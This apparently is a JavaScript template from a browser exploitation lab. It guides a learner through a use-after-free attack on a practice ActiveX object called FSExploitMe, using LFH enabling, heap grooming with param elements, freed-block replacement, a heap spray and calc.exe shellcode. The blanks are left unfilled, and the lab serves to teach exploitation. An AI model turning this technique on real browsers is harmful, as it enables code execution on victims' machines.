/*
	Lesson3.js - 
		This file is for the you to modify to exploit
		an object pointer overwrite vulnerability. 
		
		It will be called when you "Click Here" within
		Lesson 3!
		
		Things to note: 
			MakeString(size) 	- returns 2 bytes for every one requested in size. 
			shellcode  			- calc.exe 
			msfPatternString	- 2000 byte msfPatternString
			L3HeapSpray(data)	- Performs a 100mb HeapSpray with data at the start
			
*/


function L3Exercise1() {
	
	/*
		Step 1. 
		Define your replacement block here. 
	*/
	replacementBlock = "";

	/*
		Step 2. 
		Start: Enable LFH Here.
	*/
	enableLFH = new Array(0); //Define the appropriate size
	
	for (i=0; i<enableLFH.length; i++) {
		enableLFH[i] = document.createElement("param");
		enableLFH[i].name = replacementBlock;
	}
	
	// End: Enable LFH
	
	// Do not Modify: Create a new object, then return a pointer to it
	var objPtr = FSExploitMe.GetClassy(); 
	// Do not Modify: Create a new object, then return a pointer to it
	
	/*
		Step 3. (Part 1 of 2)
		Start: Prepare replacement block here
	*/
	replacements = new Array(100);
	
	for (i=0; i<replacements.length; i++) {
		replacements[i] = document.createElement("param");
	}
	
	// End: Prepare replacement block here
	
	// Do not Modify: Free the object
	FSExploitMe.KillClassy(objPtr);
	CollectGarbage();
	// Do not Modify: Free the object
	
	
	/*
		Step 3. (Part 2 of 2)
		Start: Replace freed block here
	*/
	
	for (i=0; i<replacements.length; i++) {
		replacements[i].name = replacementBlock;
	}
	
	// End: Replace freed block here
	
	/*
		Step 4.
		Call the HeapSpray();
	*/
	
	// Do not Modify: Use the freed object
	FSExploitMe.BeClassy(objPtr);
	// Do not Modify: Use the freed object
}
